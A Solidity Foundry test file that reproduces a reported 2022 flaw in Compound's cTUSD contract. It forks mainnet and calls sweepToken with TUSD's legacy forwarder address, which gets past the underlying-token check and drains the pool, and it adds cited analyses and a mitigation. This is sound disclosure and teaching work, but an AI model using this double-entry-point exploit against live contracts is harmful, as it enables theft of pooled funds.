// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';

import {IERC20} from "../../interfaces/IERC20.sol";


// forge test --match-contract Exploit_CompoudReported -vvv
/*
On Mar 2022 an audit discovered a critical issue that put millions at risk from Compound cToken contract.

// Key Info Sources
Article: https://blog.openzeppelin.com/compound-tusd-integration-issue-retrospective/
Article: https://medium.com/chainsecurity/trueusd-compound-vulnerability-bc5b696d29e2
Code: https://etherscan.io/address/0xa035b9e130f2b1aedc733eefb1c67ba4c503491f#code

Principle: Double Entry Point to ERC20 contract

    function sweepToken(IERC20 token) override external {
        require(address(token) != underlying, "CErc20::sweepToken: can not sweep underlying token");
        uint256 balance = token.balanceOf(address(this));
        token.transfer(admin, balance);
    }

ATTACK:
The TUSD contract had two entry points, the main implementation (0x0000000000085d4780b73119b644ae5ecd22b376) and a forwarder contract (0x8dd5fbce2f6a956c3022ba3663759011dd51e73e) that only delegates
the calls to the main contract. Because the require statement checked only for one address, setting the token input parameter as the forwarder will pass the check leaving the pool without
underlying tokens.

MITIGATIONS:
1) In addition to the access control or parameter control checks, track the token's balance before and after performing the transfer and check that the balance remains unchanged. 
    
    function sweepTokenFixed(IERC20 token) override external {
        require(address(token) != underlying, "CErc20::sweepToken: can not sweep underlying token");

        uint256 underlyingBalanceBefore = underlying.balanceOf(address(this));

        uint256 balance = token.balanceOf(address(this));
        token.transfer(admin, balance);

        uint256 underlyingBalanceAfter = underlying.balanceOf(address(this));
        require(underlyingBalanceAfter ==  underlyingBalanceBefore, 'Cannot withdraw underlying');
    }
*/
interface ICERC20Delegator {
    function mint(uint256 mintAmount) external payable returns (uint256);
    function balanceOf(address _of) external view returns(uint256);
    function decimals() external view returns(uint16);
    function borrow(uint256 borrowAmount) external payable returns (uint256);
    function accrueInterest() external;
    function approve(address spender, uint256 amt) external;
    function redeemUnderlying(uint256 redeemAmount) external payable returns (uint256);
    function sweepToken(IERC20 token) external;
}


contract Exploit_CompoundReported is TestHarness, TokenBalanceTracker {
    ICERC20Delegator internal cTUSD = ICERC20Delegator(0x12392F67bdf24faE0AF363c24aC620a2f67DAd86);

    IERC20 internal tusd = IERC20(0x0000000000085d4780B73119b644AE5ecd22b376); // Main entry point
    IERC20 internal tusdLegacy = IERC20(0x8dd5fbCe2F6a956C3022bA3663759011Dd51e73E); // Forwarder, side entry point

    function setUp() external {
        cheat.createSelectFork("mainnet", 14266479); // fork mainnet at block 14266479

        addTokenToTracker(address(tusd));
        addTokenToTracker(address(tusdLegacy)); // Should be the same as tusd

        updateBalanceTracker(address(cTUSD)); // Pool underlying balance.
        logBalancesWithLabel('Initial Pool Balances', address(cTUSD));
    }

    function test_attack() external {
        cheat.expectRevert(abi.encodePacked("CErc20::sweepToken: can not sweep underlying token"));
        cTUSD.sweepToken(tusd); // This reverts

        cTUSD.sweepToken(tusdLegacy); // This passes

        logBalancesWithLabel('Final Pool Balances', address(cTUSD));
    }
}